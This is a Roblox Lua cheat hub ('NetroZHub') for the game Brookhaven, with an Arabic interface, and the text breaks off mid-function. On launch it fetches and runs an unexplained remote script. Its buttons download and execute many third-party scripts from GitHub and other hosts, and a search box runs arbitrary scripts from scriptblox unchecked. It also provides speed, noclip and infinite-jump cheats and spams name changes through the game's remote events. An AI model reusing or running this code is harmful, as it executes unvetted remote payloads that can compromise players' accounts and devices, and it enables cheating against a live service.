loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/main/Tahakom74"))()

 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/mmnnnm460-byte/LOPLNN/refs/heads/main/OPIUT_library.lua"))()


Players = game:GetService("Players")
Player = Players.LocalPlayer
RunService = game:GetService("RunService")
TweenService = game:GetService("TweenService")
UserInputService = game:GetService("UserInputService")
ContextActionService = game:GetService("ContextActionService")
GuiService = game:GetService("GuiService")

ReplicatedStorage = game:GetService("ReplicatedStorage")
ReplicatedFirst = game:GetService("ReplicatedFirst")
TeleportService = game:GetService("TeleportService")
HttpService = game:GetService("HttpService")

Workspace = game:GetService("Workspace")
Lighting = game:GetService("Lighting")
PathfindingService = game:GetService("PathfindingService") 
PhysicsService = game:GetService("PhysicsService")
SoundService = game:GetService("SoundService")

StarterGui = game:GetService("StarterGui")
StarterPack = game:GetService("StarterPack")
StarterPlayer = game:GetService("StarterPlayer")
CoreGui = game:GetService("CoreGui")

ContentProvider = game:GetService("ContentProvider")
InsertService = game:GetService("InsertService")

Chat = game:GetService("Chat")
TextService = game:GetService("TextService")

DataStoreService = game:GetService("DataStoreService")
MarketplaceService = game:GetService("MarketplaceService")
BadgeService = game:GetService("BadgeService")
GroupService = game:GetService("GroupService")

HapticService = game:GetService("HapticService")
VRService = game:GetService("VRService")

PolicyService = game:GetService("PolicyService")

Stats = game:GetService("Stats")

LocalizationService = game:GetService("LocalizationService")

Debris = game:GetService("Debris")
CollectionService = game:GetService("CollectionService")
Selection = game:GetService("Selection")
ProximityPromptService = game:GetService("ProximityPromptService")
TestService = game:GetService("TestService")
LogService = game:GetService("LogService")

 Owners = {
	Sajwaad = true,
	ghalidev_0 = true,
	ghali0059 = true
}

 Admins = {
	["Zarba_751"] = true,
	["ADJ_71"] = true,
	["GOST911P"] = true,
	["fIw_603"] = true,
	["Ahhme255"] = true,
	["3w_ss"] = true,
	["FHG_12343"] = true,
	["hfgej51"] = true,
	["gon_doy652"] = true,
	["taym1084"] = true,
	["Reman1022845"] = true,
	["Ndko963"] = true,
	["Salig8889"] = true,
	["Saikudm"] = true,
	["population12333"] = true,
	["‏SGA7407"] = true,
	["10544k"] = true,
	["fatimafati20099"] = true,
	["alskndrany91"] = true,
	["azabozhra1"] = true,
	["FeeFaa7"] = true,
	["ras123678"] = true,
	["Botdevil999"] = true,
	["Mode_720"] = true,
	["at_gfj6"] = true,
	["Nykysaf"] = true,
	["talarom12349"] = true,
	["XXTAJXX63"] = true,
	["sajjad2502"] = true,
	["DemonHub_Dev"] = true,
	["malk_55117"] = true,
	["imane_pink54"] = true,
	["zdrkn305"] = true,
	["iskeowa"] = true,
	["yew99yew"] = true,
	["HUSAM1438"] = true,
	["IV_SEE"] = true,
	["Amine_city"] = true,
	["K_31387"] = true,
	["haker_457230"] = true,
	["rengoku28306"] = true,
	["Hwrejplq"] = true,
	["wkwjdnsnsndnxxnsnsn"] = true,
	["Eiles917"] = true,
	["1l3_1081"] = true,
	["PAWOR141"] = true,
	["1Khaled110"] = true,
["mohmmad47n"] = true,
	["mr_Mustafa213"] = true
}

Window = Libary:MakeWindow({
    Title = "NetroZHub- فريق",
    SubTitle = "By Ghali&Rami",
    LoadText = "NetroZHubDevelopers",
    Flags = "NetroZ_Brookhaven"
})
Window:AddMinimizeButton({
    Button = { Image = "rbxassetid://140608525913156", BackgroundTransparency = 0 },
    Corner = { CornerRadius = UDim.new(35, 1) },
})

InfoTab = Window:MakeTab({ 
    Title = "الحقوق والرتب", 
    Icon = "rbxassetid://10734985040" 
})

InfoTab:AddAnimatedButton({
    Name = "demoz", 
    Words = {"BEST", "FAST", "SAFE", "the best", "TOP 1"},
    Callback = function()
        print("تم الضغط")
    end
})

InfoTab:AddDiscordInvite({
    Name = "DemozXمطورين",
    Description = "تليجرام",
    Logo = "rbxassetid://140608525913156",
    Invite = "https://t.me/DemoZ099",
})

InfoTab:AddDevCircle({
    Devs = {
        {Name = "ghalidev_0", Id = 8653387847},
        {Name = "Sajwaad", Id = 5192983798},
        {Name = "te998te", Id = 6177993827}, 
		{Name = "SAGAD4559", Id = 10126949124}
    }
})

InfoTab:AddSection({ "حسابات TikTok" })
InfoTab:AddParagraph({
    Title = "Rami",
    Text = "@ifbr4 + @.k.wn0"
})
InfoTab:AddParagraph({
    Title = "Ghali",
    Text = "@higg_03"
})
InfoTab:AddSection({ "حسابات المطورين روب" })
InfoTab:AddParagraph({
    Title = "Rami",
    Text = "@Sajwaad + @DemonHub_Dev"
})
InfoTab:AddParagraph({
    Title = "Ghali",
    Text = "@ghali0059 + @ghalidev_0"
})
InfoTab:AddParagraph({
    Title = "Yura/محمد",
    Text = "@te998te"
})
InfoTab:AddParagraph({
    Title = "Remix/سجاد",
    Text = "@SAGAD4559"
})

InfoTab:AddSection({ "الرتب" })
SavedPlayers = {} -- [UserId] = true
InfoTab:AddToggle({
	Name = "كشف المستخدمين",
	Default = true,
	Callback = function(state)

		local TARGET_BIO = "MiDe7moZ"
		local FIRE_ON_ENABLE = "/found"
		local SYSTEM_ENABLED = state
		local connections = {}

		local function fireBio(text)
			if not SYSTEM_ENABLED then return end
			ReplicatedStorage:WaitForChild("RE")
				:WaitForChild("1RPNam1eTex1t")
				:FireServer("RolePlayBio", text)
		end

		local function fireFoundThenClear()
			if not SYSTEM_ENABLED then return end
			fireBio(FIRE_ON_ENABLE)
			task.delay(1, function()
				if SYSTEM_ENABLED then
					fireBio("")
				end
			end)
		end

		local function removeTag(plr)
			if plr.Character then
				local t = plr.Character:FindFirstChild("NameTag")
				if t then t:Destroy() end
			end
		end

		local function createTag(plr)
			if not SYSTEM_ENABLED then return end -- تحقق من الزر قبل إنشاء التاج
			if not SavedPlayers[plr.UserId] then return end
			if not plr.Character then return end

			local head = plr.Character:FindFirstChild("Head")
			if not head then return end

			removeTag(plr)

			local role = "عضو"
			if Owners[plr.Name] then
				role = "مطور"
			elseif Admins[plr.Name] then
				role = "ادمن"
			end

			local gui = Instance.new("BillboardGui")
			gui.Name = "NameTag"
			gui.Adornee = head
			gui.Parent = plr.Character
			gui.Size = UDim2.new(4, 0, 1.5, 0)
			gui.StudsOffset = Vector3.new(0, 3.5, 0)
			gui.AlwaysOnTop = true

			local frame = Instance.new("Frame", gui)
			frame.Size = UDim2.new(1, 0, 1, 0)
			frame.BackgroundTransparency = 0.1
			frame.BorderSizePixel = 0
			Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)

			local gradient = Instance.new("UIGradient", frame)
			gradient.Rotation = 90

			local stroke = Instance.new("UIStroke", frame)
			stroke.Thickness = 1.5

			local label = Instance.new("TextLabel", frame)
			label.Size = UDim2.new(1, 0, 1, 0)
			label.BackgroundTransparency = 1
			label.TextScaled = true
			label.Font = Enum.Font.GothamBold
			label.Text = role
			label.TextColor3 = Color3.new(1,1,1)

			if role == "مطور" then
				gradient.Color = ColorSequence.new{
					ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 215, 0)),
					ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 170, 0))
				}
				stroke.Color = Color3.fromRGB(255, 215, 0)

			elseif role == "ادمن" then
				gradient.Color = ColorSequence.new{
					ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 0, 0)),
					ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 50, 50))
				}
				stroke.Color = Color3.fromRGB(255, 100, 100)

			else
				gradient.Color = ColorSequence.new{
					ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 120, 170)),
					ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 180, 255))
				}
				stroke.Color = Color3.fromRGB(255, 255, 255)
			end
		end

		local function watchPlayer(plr)
			local bag = plr:WaitForChild("PlayersBag", 5)
			if not bag then return end

			local bio = bag:WaitForChild("RPBio", 5)
			if not bio then return end

			local function check()
				if bio.Value == TARGET_BIO and not SavedPlayers[plr.UserId] then
					SavedPlayers[plr.UserId] = true
					if SYSTEM_ENABLED then
						createTag(plr)
					end
				end
			end

			check()
			table.insert(connections, bio.Changed:Connect(check))
		end

		-- إطفاء Toggle → إزالة كل التاقات
		if not SYSTEM_ENABLED then
			for _, c in ipairs(connections) do
				pcall(function() c:Disconnect() end)
			end
			for _, plr in ipairs(Players:GetPlayers()) do
				removeTag(plr)
			end
			return
		end

		fireFoundThenClear()

		for _, plr in ipairs(Players:GetPlayers()) do
			watchPlayer(plr)

			-- إعادة التاج فقط إذا كان الزر مفعل
			if SYSTEM_ENABLED and SavedPlayers[plr.UserId] then
				createTag(plr)
			end

			-- التعامل مع إعادة إنشاء التاج عند CharacterAdded
			table.insert(connections, plr.CharacterAdded:Connect(function()
				task.wait(0.2)
				if SYSTEM_ENABLED and SavedPlayers[plr.UserId] then
					createTag(plr)
				end
			end))
		end

		table.insert(connections, Players.PlayerAdded:Connect(function(plr)
			watchPlayer(plr)
			table.insert(connections, plr.CharacterAdded:Connect(function()
				task.wait(0.2)
				if SYSTEM_ENABLED and SavedPlayers[plr.UserId] then
					createTag(plr)
				end
			end))
		end))

		table.insert(connections, Players.PlayerRemoving:Connect(function(plr)
			SavedPlayers[plr.UserId] = nil
		end))
	end
})
InfoTab:AddParagraph({"مطور"})
InfoTab:AddParagraph({"ادمن"})
InfoTab:AddParagraph({"عضو"})
 Active = false

 function CreateStarBackground(parent, width, height)
	 container = Instance.new("Frame")
	container.BackgroundTransparency = 1
	container.Size = UDim2.new(0, width, 0, height)
	container.ClipsDescendants = true
	container.Parent = parent

	 space = Instance.new("Frame")
	space.BackgroundColor3 = Color3.fromRGB(7, 5, 20)
	space.BackgroundTransparency = 0
	space.BorderSizePixel = 0
	space.Size = UDim2.new(1, 0, 1, 0)
	space.Parent = container

	 starCount = 70
	for _ = 1, starCount do
		 star = Instance.new("Frame")
		star.BackgroundTransparency = 0
		star.BorderSizePixel = 0
		star.Size = UDim2.new(0, 2, 0, 2)
		star.Position = UDim2.new(0, math.random(0, width), 0, math.random(0, height))
		star.ZIndex = 1

		 corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = star

		 r = math.random(1, 10)
		if r <= 6 then
			star.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		elseif r <= 9 then
			star.BackgroundColor3 = Color3.fromRGB(180, 220, 255)
		else
			star.BackgroundColor3 = Color3.fromRGB(255, 230, 180)
		end

		star.Parent = container

		 baseY = star.Position.Y.Offset
		 speed = math.random() * 0.7 + 0.3
		 amp = math.random(10, 35)
		 phase = math.random() * math.pi * 2
		 twinkle = math.random() < 0.25

		task.spawn(function()
			 t = 0
			while star.Parent do
				t = t + speed * 0.05
				star.Position = UDim2.new(0, star.Position.X.Offset, 0, baseY + math.sin(t + phase) * amp)
				if twinkle then
					 b = (math.sin(t * 2) + 1) / 2
					 c = star.BackgroundColor3
					star.BackgroundColor3 = Color3.new(
						math.min(1, c.R + b * 0.2),
						math.min(1, c.G + b * 0.2),
						math.min(1, c.B + b * 0.2)
					)
				end
				task.wait()
			end
		end)
	end

	return container
end

function CreateNotification(player, rankType, action)
	gui = Instance.new("ScreenGui")
	gui.Name = "JoinLeaveNotify_" .. player.UserId
	gui.ResetOnSpawn = false
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	gui.Parent = game:GetService("CoreGui")

	frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 260, 0, 85)
	frame.Position = UDim2.new(0.5, -130, 1, -100)
	frame.BackgroundTransparency = 1
	frame.BorderSizePixel = 0
	frame.ZIndex = 2
	frame.Parent = gui

	stars = CreateStarBackground(frame, 260, 85)

	bgColor, textColor, title = nil, nil, nil

	if rankType == "Owner" then
		bgColor = Color3.fromRGB(45, 35, 0)
		textColor = Color3.fromRGB(255, 215, 0)
		title = "مالك"
	elseif rankType == "Admin" then
		bgColor = Color3.fromRGB(40, 0, 0)
		textColor = Color3.fromRGB(255, 80, 80)
		title = "أدمــن"
	elseif rankType == "Friend" then
		bgColor = Color3.fromRGB(20, 40, 70)
		textColor = Color3.fromRGB(220, 240, 255)
		title = "صديق"
	else
		bgColor = Color3.fromRGB(30, 30, 40)
		textColor = Color3.fromRGB(230, 230, 230)
		title = "لاعب"
	end

	overlay = Instance.new("Frame")
	overlay.BackgroundColor3 = bgColor
	overlay.BackgroundTransparency = 0.15
	overlay.BorderSizePixel = 0
	overlay.Size = UDim2.new(1, 0, 1, 0)
	overlay.ZIndex = 2
	overlay.Parent = stars

	 avatar = Instance.new("ImageLabel")
	avatar.Size = UDim2.new(0, 60, 0, 60)
	avatar.Position = UDim2.new(0, 12, 0, 12)
	avatar.BackgroundTransparency = 1
	avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=150&height=150&format=png"
	avatar.ZIndex = 3
	avatar.Parent = frame

	 nameLabel = Instance.new("TextLabel")
	nameLabel.Size = UDim2.new(0, 170, 0, 24)
	nameLabel.Position = UDim2.new(0, 80, 0, 12)
	nameLabel.BackgroundTransparency = 1
	nameLabel.Font = Enum.Font.GothamBold
	nameLabel.TextSize = 15
	nameLabel.TextColor3 = textColor
	nameLabel.Text = player.Name .. " | " .. title
	nameLabel.TextXAlignment = Enum.TextXAlignment.Left
	nameLabel.ZIndex = 3
	nameLabel.Parent = frame

	 actionLabel = Instance.new("TextLabel")
	actionLabel.Size = UDim2.new(0, 170, 0, 24)
	actionLabel.Position = UDim2.new(0, 80, 0, 48)
	actionLabel.BackgroundTransparency = 1
	actionLabel.Font = Enum.Font.Gotham
	actionLabel.TextSize = 14
	actionLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
	actionLabel.Text = "» " .. action .. " «"
	actionLabel.TextXAlignment = Enum.TextXAlignment.Left
	actionLabel.ZIndex = 3
	actionLabel.Parent = frame

	 tween = TweenService:Create(
		frame,
		TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
		{ Position = UDim2.new(0.5, -130, 0, 30) }
	)
	tween:Play()

	task.delay(3, function()
		if gui and gui.Parent then
			gui:Destroy()
		end
	end)
end

 function GetPlayerRank(player)
	if Owners[player.Name] then
		return "Owner"
	elseif Admins[player.Name] then
		return "Admin"
	else
		 success, isFriend = pcall(function()
			return Player:IsFriendsWith(player.UserId)
		end)
		if success and isFriend then
			return "Friend"
		else
			return "Player"
		end
	end
end

 function StartMonitoring()
	Players.PlayerAdded:Connect(function(player)
		if Active and player ~= Player then
			 rank = GetPlayerRank(player)
			CreateNotification(player, rank, "دخل")
		end
	end)
	Players.PlayerRemoving:Connect(function(player)
		if Active and player ~= Player then
			 rank = GetPlayerRank(player)
			CreateNotification(player, rank, "خرج")
		end
	end)
end

InfoTab:AddToggle({
	Name = "إشعارات الدخول والخروج",
	Default = false,
	Callback = function(Value)
		Active = Value
		if Value then
			StartMonitoring()
		end
	end
})
MainTab = Window:MakeTab({ Title = "القائمة الرئيسية", Icon = "rbxassetid://10734985040" })

MainTab:AddProfileCard() 

MainTab:AddAnimatedButton({
    Name = "DemoZ",
    Words = {"BEST", "FAST", "SAFE", "TOP 1"},
    Callback = function()
        print("تم الضغط على زر الديموز المتحرك!")
    end
})
MainTab:AddSection({ "اهلا بك في سكربتنا" })
MainTab:AddParagraph({
    Title = "التحديث",
    Text = "NetroZHub V1"
})
MainTab:AddParagraph({
    Title = "التحديث الكامل الرسمي",
    Text = "DemoZ تعاون فريق"
})
MainTab:AddParagraph({
    Title = "هنا انجازاتنا",
    Text = "By DemoZ Team"
})
MainTab:AddParagraph({
    Title = "لأستخدامهم السكربت F7LKMنشكر اعضاء كلان",
    Text = "خصوصاً عثمان وفهد الادمن"
})
MainTab:AddParagraph({
    Title = "من اعادة تصنيع الى سكربت مستقل كامل",
    Text = ""
})
MainTab:AddParagraph({
    Title = "اقوى سكربت بالعالم متكامل من كل النواحي",
    Text = ""
})
MainTab:AddParagraph({
    Title = "تم تصنيع هذه السكربت بعناية لدرجة انك لاتحتاج غيره",
    Text = ""
})
Tab = Window:MakeTab({ 
    Title = "بحث السكربتات", 
    Icon = "rbxassetid://10734985040" 
})

Tab:AddParagraph({"اضغط على الزر لتفعيل السكربت"})
local HttpService = game:GetService("HttpService")
local player = game.Players.LocalPlayer

resultButtons = {}

for i = 1, 10 do
    resultButtons[i] = Tab:AddSquareButton({
        Name = "---",
        ImageId = 0,
        Callback = function() end
    })
end

function SearchWithUpdate(query)
    if #query < 3 then return end

    local success, response = pcall(function()
        return game:HttpGet("https://scriptblox.com/api/script/search?q=" .. HttpService:UrlEncode(query) .. "&max=10")
    end)
    
    if success then
        local data = HttpService:JSONDecode(response)
        if data and data.result and data.result.scripts then
            for i = 1, 10 do
                local scr = data.result.scripts[i]
                if scr then
                                       resultButtons[i]:Update({
                        Name = scr.title,
                        ImageId = 120019293519166, 
                        Callback = function()
                            print("Executing: " .. scr.title)
                            loadstring(scr.script)()
                        end
                    })
                else
                    
                    resultButtons[i]:Update({
                        Name = "No Result",
                        ImageId = 0,
                        Callback = function() end
                    })
                end
            end
        end
    end
end
Tab:Addghalitextbox({
    Name = "Search",
    Placeholder = "اكتب اسم السكربت هنا . . .",
    Callback = function(txt)
        task.spawn(function()
            SearchWithUpdate(txt)
        end)
    end
})
TabFE = Window:MakeTab({"التحولات", "rbxassetid://121106070017957"})
Buttons = {
{"ناروتو","","https://raw.githubusercontent.com/mxskf/Legal/refs/heads/main/Dboas"},
{"باتمان","","https://raw.githubusercontent.com/mxskf/Legal/refs/heads/main/Dboas89"},
{"سونيك","","https://raw.githubusercontent.com/mxskf/Legal/refs/heads/main/Dboas86"},
{"بانيسو","","https://raw.githubusercontent.com/BRENOPOOF/yyyyyyyface/refs/heads/main/Main.txt"},
{"مورتي","","https://raw.githubusercontent.com/repositoryredzlib/Mortyyyyyy/refs/heads/main/Main.txt"},
{"ريك سانشيز","","https://raw.githubusercontent.com/BRENOPOOF/rick-Sanchez-/refs/heads/main/Main.txt"},
{"راعي البقر","","https://raw.githubusercontent.com/BRENOPOOF/wjsj/refs/heads/main/Main.txt"},
{"قيست 666","","https://raw.githubusercontent.com/lyrarepositorio-afk/swsw/refs/heads/main/Main.txt"},
{"اوبيتو","","https://cdn.authguard.org/virtual-file/c47b8a12ca6c4cef840280dafd893e7d"},
{"شادو","","https://raw.githubusercontent.com/267266273ffsfs/Shadow/refs/heads/main/Main.txt"},
{"قونر","يظهر للناس","https://raw.githubusercontent.com/lyrarepositorio-afk/GONER/refs/heads/main/Main.txt"},
{"نولي","يظهر للناس","https://raw.githubusercontent.com/lyrarepositorio-afk/gubby/refs/heads/main/Main.txt"},
{"تيوبرس","يظهر للناس","https://raw.githubusercontent.com/BRENOPOOF/1222/refs/heads/main/Main.txt"},
{"يد مقطوعة","في مسلسل وينزداي","https://raw.githubusercontent.com/BRENOPOOF/slafiznotedio/refs/heads/main/Main.txt"},
{"C00LKIDD","كولكيد","https://raw.githubusercontent.com/repositoryredzlib/xzzxsx/refs/heads/main/Main.txt"},
{"سكربت الرقصات المشهور","","https://raw.githubusercontent.com/Gazer-Ha/Free-emote/refs/heads/main/Delta%20mad%20stuffs"},
{"هيروبراين","يظهر للناس","https://raw.githubusercontent.com/lyrarepositorio-afk/hEROBRINE/refs/heads/main/Main.txt"},
{"قطة الكرتون","","https://raw.githubusercontent.com/lyrarepositorio-afk/cartoon-cat/refs/heads/main/Main.txt"},
{"الاومنيتريكس","","https://raw.githubusercontent.com/267266273ffsfs/Ominitrix/refs/heads/main/Main.txt"},
{"كاموي * ترونو","","https://raw.githubusercontent.com/267266273ffsfs/kamui/refs/heads/main/Main.txt"},
{"ضرب*18","","https://raw.githubusercontent.com/yeahblxr/Scripts/refs/heads/main/Edge.lua"},
{"سكربت مشيات ورقصات","","https://rawscripts.net/raw/Universal-Script-AFEM-Max-Open-Alpha-50210"},
{"القاتل","","https://raw.githubusercontent.com/267266273ffsfs/Jeff/refs/heads/main/Main.txt"}
}

for _,v in ipairs(Buttons) do
TabFE:AddButton({
Name = v[1],
Desc = v[2],
Callback = function()
pcall(function()
loadstring(game:HttpGet(v[3]))()
end)
end
})
end


TabFE:AddButton({
Name = "جون دي",
Description = "",
Callback = function()
pcall(function()

ChangeBodyColor = ReplicatedStorage.Remotes.ChangeBodyColor
ChangeCharacterBody = ReplicatedStorage.Remotes.ChangeCharacterBody
Wear = ReplicatedStorage.Remotes.Wear

ChangeBodyColor:FireServer("Really black")

ChangeCharacterBody:InvokeServer({
0,0,0,0,0,0
})

Wear:InvokeServer(119700638189201)
Wear:InvokeServer(82561279414761)
Wear:InvokeServer(108099676910294)
Wear:InvokeServer(82861921093234)
Wear:InvokeServer(124476454384081)
Wear:InvokeServer(5319900634)
Wear:InvokeServer(5319909330)
Wear:InvokeServer(5319922112)

end)
end
})
local TabNM = Window:MakeTab({ 
Title = "اللاعب والاسم", 
Icon = "rbxassetid://10723415903" })
pl = Players.LocalPlayer

 DEFAULT_SPEED = 16
 DEFAULT_JUMP = 50
 DEFAULT_GRAVITY = 196.2

 SpeedValue = DEFAULT_SPEED
 JumpValue = DEFAULT_JUMP
 GravityValue = DEFAULT_GRAVITY

 function getHumanoid()
    local char = pl.Character or pl.CharacterAdded:Wait()
    return char:WaitForChild("Humanoid")
end

TabNM:AddTextBox({
    Name = "سرعة اللاعب",
    PlaceholderText = "اكتب سرعة اللاعب",
    Callback = function(value)
        SpeedValue = tonumber(value) or DEFAULT_SPEED
    end
})

TabNM:AddButton({
    Name = "تفعيل السرعة",
    Callback = function()
        local hum = getHumanoid()
        hum.WalkSpeed = SpeedValue
    end
})

TabNM:AddTextBox({
    Name = "قوة القفز",
    PlaceholderText = "اكتب قوة القفز",
    Callback = function(value)
        JumpValue = tonumber(value) or DEFAULT_JUMP
    end
})

TabNM:AddButton({
    Name = "تفعيل القفز",
    Callback = function()
        local hum = getHumanoid()
        hum.UseJumpPower = true
        hum.JumpPower = JumpValue
    end
})

TabNM:AddTextBox({
    Name = "الجاذبية",
    PlaceholderText = "اكتب الجاذبية",
    Callback = function(value)
        GravityValue = tonumber(value) or DEFAULT_GRAVITY
    end
})

TabNM:AddButton({
    Name = "تفعيل الجاذبية",
    Callback = function()
        workspace.Gravity = GravityValue
    end
})


TabNM:AddButton({
    Name = "إعادة كل شيء للوضع الطبيعي",
    Callback = function()
        local hum = getHumanoid()
        hum.WalkSpeed = DEFAULT_SPEED
        hum.UseJumpPower = true
        hum.JumpPower = DEFAULT_JUMP
        workspace.Gravity = DEFAULT_GRAVITY
    end
})
TabNM:AddToggle({
	Name = "قفز لانهائي",
	Default = false,
	Callback = function(state)

		if state then
			if _G.InfJumpConn then
				pcall(function() _G.InfJumpConn:Disconnect() end)
				_G.InfJumpConn = nil
			end

			_G.InfJumpConn = UserInputService.JumpRequest:Connect(function()
				if Player and Player.Character then
					hum = Player.Character:FindFirstChildOfClass("Humanoid")
					if hum then
						hum:ChangeState(Enum.HumanoidStateType.Jumping)
					end
				end
			end)

		else
			if _G.InfJumpConn then
				pcall(function() _G.InfJumpConn:Disconnect() end)
				_G.InfJumpConn = nil
			end
		end

	end
})
TabNM:AddToggle({
	Name = "Noclip قوي",
	Default = false,
	Callback = function(state)

		if state then
			if _G.NoclipConn then
				pcall(function() _G.NoclipConn:Disconnect() end)
				_G.NoclipConn = nil
			end

			_G.NoclipConn = RunService.Stepped:Connect(function()
				if Player and Player.Character then
					for _, part in ipairs(Player.Character:GetDescendants()) do
						if part:IsA("BasePart") then
							part.CanCollide = false
						end
					end
				end
			end)

		else
			if _G.NoclipConn then
				pcall(function() _G.NoclipConn:Disconnect() end)
				_G.NoclipConn = nil
			end

			if Player and Player.Character then
				for _, part in ipairs(Player.Character:GetDescendants()) do
					if part:IsA("BasePart") then
						part.CanCollide = true
					end
				end
			end
		end

	end
})
local RE = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eColo1r")

local rainbowColors = {}
for i = 1, 15 do
    rainbowColors[i] = Color3.fromHSV(i/15, 1, 1)
end

local NameRainbowEnabled = false
local BioRainbowEnabled = false
local NameSpeed = 1
local BioSpeed = 1

local function SetNameColor(c)
    RE:FireServer("PickingRPNameColor", c)
end

local function SetBioColor(c)
    RE:FireServer("PickingRPBioColor", c)
end

TabNM:AddToggle({
    Name = "تلوين اسم(VIP)",
    Default = false,
    Callback = function(v)
        NameRainbowEnabled = v

        task.spawn(function()
            while NameRainbowEnabled do
                for i = 1, #rainbowColors do
                    if not NameRainbowEnabled then break end
                    SetNameColor(rainbowColors[i])
                    task.wait(0.01 / NameSpeed)
                end
            end
        end)
    end
})

TabNM:AddSlider({
    Name = "Name Speed",
    Min = 1,
    Max = 5,
    Increase = 1,
    Default = 1,
    Callback = function(v)
        NameSpeed = v
    end
})

TabNM:AddToggle({
    Name = "تلوين بايو(VIP)",
    Default = false,
    Callback = function(v)
        BioRainbowEnabled = v

        task.spawn(function()
            while BioRainbowEnabled do
                for i = 1, #rainbowColors do
                    if not BioRainbowEnabled then break end
                    SetBioColor(rainbowColors[i])
                    task.wait(0.01 / BioSpeed)
                end
            end
        end)
    end
})

TabNM:AddSlider({
    Name = "Bio Speed",
    Min = 1,
    Max = 5,
    Increase = 1,
    Default = 1,
    Callback = function(v)
        BioSpeed = v
    end
})

SectionSpam = TabNM:AddSection({
    Name = "(new)سبام اسماء"
})

 names = {"", "", ""}
 execSpeed = 1
 toggleActive = false

for i = 1, 3 do
TabNM:AddTextBox({
        Name = "أدخل الاسم " .. i,
        Default = "",
        TextDisappear = false,
        Callback = function(value)
            names[i] = value
        end
    })
end

TabNM:AddSlider({
    Name = "سرعة السبام",
    Min = 1,
    Max = 3,
    Default = 1,
    Increment = 1,
    ValueName = "x",
    Callback = function(value)
        execSpeed = value
    end
})

TabNM:AddToggle({
    Name = "تشغيل السبام",
    Default = false,
    Callback = function(state)
        toggleActive = state
        if toggleActive then
            local hasName = false
            for _, name in ipairs(names) do
                if name ~= "" then
                    hasName = true
                    break
                end
            end

            if not hasName then
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "تحذير",
                    Text = "يجب إدخال اسم واحد على الأقل قبل التشغيل"
                })
                toggleActive = false
                return
            end

            
            task.spawn(function()
                while toggleActive do
                    for _, name in ipairs(names) do
                        if not toggleActive then break end
                        if name ~= "" then
                            local args = {
                                "RolePlayName",
                                name
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
                            task.wait((4 - execSpeed) * 0.5)
                        end
                    end
                end
            end)
        end
    end
})
TabNM:AddSection({ "" })

ChatTab = Window:MakeTab({ 
Title = "الشات", 
Icon = "rbxassetid://10723415903" })

ChatTab:AddToggle({
    Name = " إظهار / إخفاء الشات القديم",
    Default = true,
    Callback = function(state)
        pcall(function()
            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, state)
        end)
    end
})
ChatTab:AddButton({
    Name = "سكربت الشات",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperTradei/Super/refs/heads/main/C-71.txt"))()
    end
})
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")

local shaderEffects = {}
local shaderPresets = {}
local currentPreset = ""

local activeAssets = {}
local activeSound = nil
local originalData = {}
local currentSeason = "شتاء"

local SavedLightingProps = {}
local SavedLightingObjects = {}

local function createEffect(effectType, props)
    local existing = Lighting:FindFirstChild("ShadowShader_"..effectType)
    if existing then existing:Destroy() end

    local effect = Instance.new(effectType)
    effect.Name = "ShadowShader_"..effectType

    for k,v in pairs(props) do
        if effect[k] ~= nil then
            effect[k] = v
        end
    end

    effect.Enabled = true
    effect.Parent = Lighting
    shaderEffects[effectType] = effect
    return effect
end

local function getEffect(name)
    return shaderEffects[name]
end

local function removeEffect(name)
    local e = shaderEffects[name]
    if e then
        e:Destroy()
        shaderEffects[name] = nil
    end
end

local function removeAllShaders()
    for _,v in pairs(shaderEffects) do
        if v and v.Parent then
            v:Destroy()
        end
    end
    table.clear(shaderEffects)
end

local function applyPreset(name)
    removeAllShaders()
    local preset = shaderPresets[name]
    if preset then
        for effect,props in pairs(preset) do
            createEffect(effect,props)
        end
        currentPreset = name
    end
end

local function saveLighting()
    SavedLightingProps = {
        Brightness = Lighting.Brightness,
        ClockTime = Lighting.ClockTime,
        ExposureCompensation = Lighting.ExposureCompensation,
        FogColor = Lighting.FogColor,
        FogStart = Lighting.FogStart,
        FogEnd = Lighting.FogEnd,
        Ambient = Lighting.Ambient,
        OutdoorAmbient = Lighting.OutdoorAmbient,
        ColorShift_Top = Lighting.ColorShift_Top,
        ColorShift_Bottom = Lighting.ColorShift_Bottom,
        EnvironmentDiffuseScale = Lighting.EnvironmentDiffuseScale,
        EnvironmentSpecularScale = Lighting.EnvironmentSpecularScale,
        GeographicLatitude = Lighting.GeographicLatitude,
        GlobalShadows = Lighting.GlobalShadows,
        ShadowSoftness = Lighting.ShadowSoftness,
        Technology = Lighting.Technology
    }

    table.clear(SavedLightingObjects)

    for _,v in pairs(Lighting:GetChildren()) do
        if v:IsA("PostEffect") or v:IsA("Atmosphere") or v:IsA("Sky") then
            table.insert(SavedLightingObjects,v:Clone())
        end
    end
end

local function restoreLighting()
    for k,v in pairs(SavedLightingProps) do
        Lighting[k] = v
    end

    for _,v in pairs(Lighting:GetChildren()) do
        if v:IsA("PostEffect") or v:IsA("Atmosphere") or v:IsA("Sky") then
            v:Destroy()
        end
    end

    for _,v in pairs(SavedLightingObjects) do
        v:Clone().Parent = Lighting
    end
end

local function storeOriginals()
    for _,part in pairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") and not part:IsDescendantOf(LocalPlayer.Character) then
            if not originalData[part] then
                originalData[part] = {Color = part.Color,Material = part.Material}
            end
